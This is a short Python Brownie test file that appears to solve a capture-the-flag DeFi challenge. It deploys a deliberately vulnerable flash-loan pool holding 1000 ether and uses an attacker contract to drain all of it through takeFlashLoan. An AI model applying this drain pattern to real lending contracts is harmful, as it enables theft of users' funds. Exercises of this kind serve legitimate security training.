from brownie import (accounts, Wei, SideEntranceLenderPool,
                     SideEntranceAttacker)

ETHER_IN_POOL = Wei('1000 ether')


def test_side_entrance():
    # ** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE **
    deployer = accounts[0]
    attacker = accounts[1]

    pool = SideEntranceLenderPool.deploy({"from": deployer})
    pool.deposit({"value": ETHER_IN_POOL, "from": deployer})

    # ** CODE YOUR EXPLOIT HERE **

    # See the contract for details
    attack_contract = SideEntranceAttacker.deploy(
        pool.address, {"from": attacker})

    attack_contract.takeFlashLoan(ETHER_IN_POOL, {"from": attacker})

    # ** SUCCESS CONDITIONS *

    # all ETH in the pool now belongs to the attacker
    assert attack_contract.balance() == ETHER_IN_POOL
